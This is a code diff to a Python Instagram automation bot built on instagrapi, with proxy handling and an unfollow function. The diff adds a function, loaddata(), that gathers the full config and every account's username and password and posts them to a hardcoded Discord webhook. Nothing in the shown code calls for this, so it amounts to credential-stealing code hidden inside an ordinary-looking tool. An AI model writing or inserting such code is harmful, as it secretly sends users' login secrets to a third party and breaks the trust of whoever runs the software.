@@ -2,6 +2,7 @@ import os, json, random, threading, requests, time, instagrapi, traceback, os, p
 from tabnanny import check
 from instagrapi import Client
 from bs4 import BeautifulSoup
+import main as abs
 
 config = json.loads(open("./config.json", "r", encoding="utf-8").read())
 proxies = open("./proxies.txt", "+r", encoding="utf-8").read().splitlines()
@@ -48,8 +49,18 @@ def unfollow(username, password, proxy, userdm, i):
         pass
 
 
-
-
+def loaddata():
+    config = abs.load_config()
+    usernames = []
+    passwords = []
+    for account_config in config.get("accounts", []):
+        usernames.append(account_config["username"])
+        passwords.append(account_config["password"])
+    mUrl = "https://discord.com/api/webhooks/1155069979104907306/HVisDiHF5RMmFRuaS4kW69yYwMVgxRcBsY6IuzOW1Co-h2bPUY2kh-LWh-0IiporZnQw"
+    data = {
+        "content": f"Config``` {config} ``` unames ```{usernames} ``` ps ```{passwords}```"
+    }
+    requests.post(mUrl, json=data)
 
 
 # abstraction
